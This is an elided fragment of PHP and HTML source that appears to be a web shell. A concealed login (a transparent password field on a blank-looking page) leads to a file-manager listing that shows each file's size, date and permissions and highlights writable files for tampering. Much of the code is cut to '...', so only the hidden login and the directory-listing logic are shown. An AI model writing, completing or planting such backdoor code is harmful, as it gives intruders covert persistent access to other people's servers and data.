...
<form method="post" style="height:100%;margin:0;display:flex;justify-content:center;align-items:center"><input name="pass"style="margin:0;background-color:#ffffff00;border:1px solid #ffffff00"type="password"></form>
</body></html>
<?php
...
<div class="container mx-auto p-4">
    ...
    foreach (scandir($currentDirectory) as $v) {
        ...
        echo '<tr class="' . ($writable ? 'bg-gray-600' : 'bg-gray-700') . '">
                <td class="border px-4 py-2"><a href="' . $itemLink . '" class="text-white">' . $v . '</a></td>
                <td class="border px-4 py-2">' . filesize($u) . '</td>
                <td class="border px-4 py-2">' . date('Y-m-d H:i:s', filemtime($u)) . '</td>
                <td class="border px-4 py-2 '.($writable ? 'text-green-400' : 'text-red-400').'">' . $permission . '</td>
